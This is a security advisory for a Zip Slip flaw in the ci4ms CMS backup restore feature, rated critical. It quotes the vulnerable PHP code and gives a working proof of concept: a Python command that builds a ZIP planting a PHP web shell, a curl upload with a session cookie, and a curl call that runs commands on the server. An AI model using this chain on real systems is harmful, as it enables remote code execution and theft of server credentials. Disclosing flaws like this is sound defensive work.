# [C] CI4MS Backup::restore is vulnerable to Zip Slip leading to RCE

## Summary
Severity: Critical
Advisory: GHSA-xp9f-pvvc-57p4
CVE: CVE-2026-41202
CWE: CWE-22
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-04-22
Source: https://github.com/advisories/GHSA-xp9f-pvvc-57p4
Type: github-advisory

## Affected
- Packagist: `ci4-cms-erp/ci4ms` — affected >=0 <0.31.5.0

## Details
### Summary
ci4ms Backup::restore extracts user uploaded ZIP archives without validating entry names, allowing an authenticated backend user with the backup create permission to write files to arbitrary filesystem locations (Zip Slip) and achieve remote code execution by dropping a PHP file under the public web root.

### Details
modules/Backup/Controllers/Backup.php:80-119 implements the restore action. The uploaded file is moved to `WRITEPATH . 'uploads/'`, and if the extension is `zip`, ZipArchive::extractTo() is called directly without iterating entries to verify they resolve inside the destination:

```php
public function restore()
{
    $valData = ([
        'backup_file' => ['label' => 'Backup File', 'rules' => 'uploaded[backup_file]|ext_in[backup_file,zip]'],
    ]);
    if ($this->validate($valData) == false) return redirect()->route('backup')->withInput()->with('errors', $this->validator->getErrors());
    $file = $this->request->getFile('backup_file');

    if ($file && $file->isValid() && ! $file->hasMoved()) {
        $newName    = $file->getRandomName();
        $uploadPath = WRITEPATH . 'uploads/';
        ...
        $filePath = WRITEPATH . 'uploads/' . $newName;
        $sqlPath  = $filePath;
        if ($ext === 'zip') {
            $zip = new \ZipArchive();
            if ($zip->open($filePath) === true) {
                $zip->extractTo($uploadPath);          // no entry-name validation
                $sqlPath = $uploadPath . $zip->getNameIndex(0);
                $zip->close();
                @unlink($filePath);
            }
        }
        ...
    }
}
```

A ZIP containing entries like `../../public/shell.php` is extracted outside `writable/uploads/` into directories served by PHP. The author validates entries correctly in modules/Methods/Controllers/Methods.php:165-175 with a realpath + regex loop; the same check is missing here.

Routing: modules/Backup/Config/Routes.php binds `POST backend/backup/restore` to Backup::restore with `role=create`, and modules/Backup/Config/BackupConfig.php adds `backend/backup` and `backend/backup/*` to `csrfExcept`, so the route accepts cross-site POSTs from an authenticated administrator's browser.

### PoC
Build the archive:

```python
python3 -c "
import zipfile
with zipfile.ZipFile('evil.zip','w') as z:
    z.writestr('../../public/shell.php', '<?php system(\$_GET[\"c\"]); ?>')
    z.writestr('dump.sql', 'SELECT 1;')
"
```

Submit it as a backup to restore:

```bash
curl -i -b 'ci4ms_session=<SESSION_ID>' \
  -F 'backup_file=@evil.zip' \
  https://target.example.com/backend/backup/restore
```

Trigger the shell:

```bash
curl 'https://target.example.com/shell.php?c=id'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Impact
Any ci4ms account that can restore a backup can write arbitrary files under the application root and gain remote code execution on the server, fully compromising the installation, the database credentials stored in .env, and any content the site handles. Because the route is in the csrfExcept list, a logged-in administrator who visits a malicious page can be forced to perform the restore cross-site, turning this into drive-by RCE against site operators.

## References
- https://github.com/ci4-cms-erp/ci4ms/security/advisories/GHSA-xp9f-pvvc-57p4
- https://nvd.nist.gov/vuln/detail/CVE-2026-41202
- https://github.com/ci4-cms-erp/ci4ms
- https://github.com/ci4-cms-erp/ci4ms/releases/tag/0.31.5.0
